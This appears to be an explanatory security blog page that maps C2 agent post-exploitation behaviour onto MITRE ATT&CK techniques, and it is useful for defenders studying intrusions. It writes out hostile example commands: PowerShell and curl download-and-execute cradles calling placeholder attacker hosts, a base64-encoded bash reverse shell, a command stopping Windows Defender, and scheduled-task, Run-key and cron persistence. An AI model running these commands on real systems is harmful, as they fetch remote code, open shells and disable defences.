---
showTableOfContents: true
title: "A Map of C2 Agent Behavior on the Endpoint"
type: "page"
---

## Introduction

The modern cyber-attack lifecycle is a multi-stage campaign, but it is within the post-exploitation phase that an adversary's true objectives are pursued and realized. Once initial access is achieved, the C2 agent, a malicious process (or set of processes) operating on the compromised host, becomes the **primary instrument of the intrusion**.

This transition is a shift from a static payload to an active, dynamic entity tasked with establishing a durable presence, understanding its environment, escalating privileges, expanding its foothold, and ultimately, achieving the attacker's strategic goals. 
This report provides an **exhaustive, multi-level conceptual map of the on-host behaviours exhibited by a C2 agent**, detailing the intricate web of actions that unfold after the initial point of compromise.

---

## MITRE ATT&CK

To infuse some sense of order into what could be perceived as an overly complex and chaotic conceptual terrain, 
I've decided to leverage the [MITRE ATT&CK](https://attack.mitre.org) framework as its foundational taxonomy.
The ATT&CK framework provides a globally recognized, behaviour-centric lexicon that **categorizes adversary actions into tactics (the "why") and techniques (the "how")**, based on real-world observations of cyber incidents.

By focusing on the post-compromise tactics, from [Execution (TA0002)](https://attack.mitre.org/tactics/TA0002/) through 
[Exfiltration (TA0010)](https://attack.mitre.org/tactics/TA0010/), this analysis offers what I hope may serve as a 
doctrinal blueprint of adversary operations on the endpoint. 
But, it's crucial to understand that these tactics are not a linear progression. An adversary does not simply move from left to right across the ATT&CK matrix.

Instead, they operate in a fluid, iterative cycle, often returning to previous tactics as they deepen their understanding of the target environment and acquire new capabilities.


This map, therefore, is not a simple checklist but a **conceptual map to the complex, interconnected, and often cyclical landscape of post-exploitation behaviour**.


---

## Part I: Establishing and Fortifying the Beachhead

The initial moments following a successful compromise are critical for the C2 agent.

At the start the typical initial objectives are:
1. To transition from a dormant state to active execution (**Execution**),
2. Secure its position against system restarts and other disruptions (**Persistence**), and
3. Acquire the necessary permissions to operate without constraint (**Privilege Escalation**).

Success in these three areas transforms a fragile, transient foothold into a resilient and powerful operational base from which all subsequent actions are launched.

NOTE: The intention of this guide is to focus on actions on the endpoint, as such we will assume an outbound connection to the C2 server is already established, and will not be covering as a discrete action.

<br>

### Section 1: Execution (TA0002)

Execution is the pivotal tactic where an adversary's code begins to **run on a compromised system**. It is the spark that ignites the post-exploitation phase, enabling the C2 agent to perform its designated functions.

The methods of execution are diverse, often chosen not just for their ability to run code but for their inherent stealth and capacity to evade initial defensive scrutiny. Modern C2 agents tend to utilize techniques that **blend in with legitimate system activity** or operate entirely within system memory to avoid leaving a tell-tale footprint on the disk.

<br>

#### Command and Scripting Interpreter (T1059): The Native Toolset

One of the most prevalent execution strategies involves the abuse of native command and script interpreters. This approach is a cornerstone of "Living-off-the-Land" (LotL) attacks, where adversaries **leverage tools already present on the target system to carry out their objectives**. By using legitimate, often Microsoft-signed, binaries, attackers can make their activity appear as normal administrative work, thereby bypassing simple application whitelisting and signature-based detection mechanisms.





<br>

#### PowerShell (T1059.001)


PowerShell has become the _de facto_ command-line interface and scripting language for adversaries operating on Windows systems. Its popularity stems from its deep integration with the Windows OS, direct access to the .NET framework, and robust remote execution capabilities. One can argue that the majority of the malware families of the last decade have relied on obfuscated PowerShell commands, often launched from malicious Office document macros, to act as a "stager" that downloads the main malware payload from a remote server.

But many frameworks employ PowerShell not only as a stager script, but to perform a variety of tasks, from reconnaissance to lateral movement. I'll provide a few common examples below, but please be aware the goal here is not to provide a comprehensive overview of every way C2 agents employ PowerShell, rather to give a general sense of how it might be employed.

<br>

**-EncodedCommand**

A common evasion tactic associated with PowerShell is the use of the `-EncodedCommand` flag, which allows an adversary to pass a Base64-encoded script to the PowerShell executable. This prevents the raw script from appearing in command-line logs, forcing defenders to decode the content to understand its intent.

A typical command might look like this:
```powershell
powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAtAHMAZQByAHYAZQByAC4AYwBvAG0ALwBtAGEAbABpAGMAaQBvAHUAcwAtAHMAYwByAGkAcAB0AC4AcABzADEAJwApAA==
```

<br>

**Invoke-Expression (IEX)**

This powerful cmdlet allows for the execution of strings as PowerShell code. C2 agents frequently use this in conjunction with the `Net.WebClient` class to create a "fileless" attack. A command can be downloaded from a remote server and executed directly in memory without ever touching the disk.


A typical command might look like this:

```powershell
powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://mrderp.com/payload.ps1')"
```

<br>

**Fileless Persistence in the Registry**

To maintain a foothold on a compromised system, C2 agents may store malicious PowerShell scripts directly within the Windows Registry. This avoids leaving suspicious files on the file system. The agent can then use a simple command to read and execute the script from the registry.


For instance, a payload could be stored in a registry key, and then executed with a command like:
```powershell
powershell.exe -c "IEX(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Debug' -Name 'Payload').Payload"
 ```

<br>

**Windows Management Instrumentation (WMI)**

WMI is a powerful interface for managing Windows systems, and adversaries frequently abuse it for lateral movement and code execution.

A C2 agent can use WMI to run commands on a remote machine, which can be a stealthy alternative to other remote execution tools. The `Invoke-WmiMethod` or `Invoke-CimMethod` cmdlets can be used to execute processes on remote systems.

An example of this for lateral movement would be:

```powershell
Invoke-CimMethod -ComputerName remote-host -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = 'powershell.exe -e <base64_encoded_payload>'}
```

<br>

#### Windows Command Shell (T1059.003)

The traditional Windows Command Shell, `cmd.exe`, remains a popular + reliable tool for execution. While less powerful than PowerShell, it is still leveraged for running simple commands, executing batch scripts, and launching other malicious tools or payloads. Its simplicity and universal presence make it a fallback for many C2 agents.

For example, TrickBot has been observed using macros in Excel documents to invoke `cmd.exe` instead of PowerShell to download and deploy its malware. Nearly all C2 frameworks, including Cobalt Strike's interactive `shell` command, provide the ability to interact with `cmd.exe` on the compromised host.

Beyond simple file execution, adversaries leverage `cmd.exe` to orchestrate a series of built-in Windows command-line tools for reconnaissance, persistence, and lateral movement. 

Below are a few common examples of how C2 agents use `cmd.exe` to call these tools:

<br>


**Reconnaissance**

Immediately after gaining access, an attacker will want to understand the system and network environment. They use `cmd.exe` to run a sequence of simple discovery commands, often redirecting the output to a temporary file in a staging directory (like `C:\Windows\Temp\`) for later exfiltration.

```shell
cmd.exe /c "net user > C:\Windows\Temp\users.txt && net group "Domain Admins" /domain > C:\Windows\Temp\admins.txt && tasklist /v > C:\Windows\Temp\tasks.txt"
```

<br>

**Persistence with Scheduled Tasks**

One way in which threat actors can ensure their process survives a system restart is by creating a scheduled tasks. The `schtasks.exe` utility is a direct way to achieve this from the command line.

An attacker might create a task that runs a payload at system startup or when a user logs on. As an example below, they can use a command to create a task named "Updater" that will execute `payload.exe` every time any user logs on.

```shell
cmd.exe /c schtasks /create /sc onlogon /tn "Updater" /tr "C:\Users\Public\payload.exe"
```
<br>


**Modifying Services or the Registry**
Attackers can manipulate Windows services to execute their malware or alter system security settings by modifying the registry. The `sc.exe` (Service Control) and `reg.exe` (Registry) command-line tools are popular for this purpose.


Attackers might stop a defensive application.
```shell
cmd.exe /c sc stop Windefend
```


As another example, an add a "Run" key to the registry for persistence.
```shell
cmd.exe /c reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "AdobeUpdater" /t REG_SZ /d "C:\Users\Public\payload.exe"
```
<br>


#### Unix Shell (T1059.004)


In Linux and macOS environments, shells such as `bash`, `zsh`, or `sh` serve the same purpose as their Windows counterparts. An adversary will abuse these shells to execute discovery commands (e.g., `whoami`, `ifconfig`), run Python or Perl scripts, and manage the compromised system.

Given the script-heavy nature of system administration on these platforms, malicious shell usage can be difficult to distinguish from legitimate activity without careful behavioural analysis.

Adversaries frequently exploit the powerful and flexible nature of these shells to download and execute payloads in a single, fileless command, establish stealthy persistence, and obfuscate their actions from defenders.

Here are a few common examples of how C2 agents abuse Unix shells:

<br>

**Fileless In-Memory Execution**

A hallmark of modern malware on Linux and macOS is downloading a script and piping it directly to a shell interpreter for execution.

This avoids writing the payload to disk, bypassing many simple antivirus and file integrity monitoring tools. The `curl` or `wget` utilities are often used for this.

```bash
curl -s http://evil-server.com/payload.sh | bash
```

In this command, `curl` fetches the script, and the `-s` flag keeps it silent (no progress meter). The output (the script content) is then piped (`|`) directly to the `bash` interpreter, which executes it on the fly.

<br>

**Persistence via Cron Jobs**

The cron daemon is the standard task scheduler on Unix-like systems, making it a primary target for persistence. An attacker can add an entry to the user's crontab file to execute a command or script at a regular interval. Often, this is done through a command that combines `echo` and `crontab`.

```bash
(crontab -l ; echo "*/15 * * * * /tmp/implant.sh") | crontab -
```

This command first lists the current crontab entries (`crontab -l`), appends a new job that runs `/tmp/implant.sh` every 15 minutes, and then pipes the combined list back into `crontab` to install it.

<br>

**Simple Command Obfuscation**

While not as complex as PowerShell's ecosystem, attackers still use simple encoding to hide their commands from casual inspection of logs or `.bash_history` files. Base64 is a common choice. An attacker can encode a malicious command and then decode and execute it in one line.

```bash
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuNS80NDQ0IDA+JjEK" | base64 --decode | bash
```















---
[|TOC|]({{< ref "../../malware/_index.md" >}})
[|PREV|]({{< ref "../../malware/_index.md" >}})

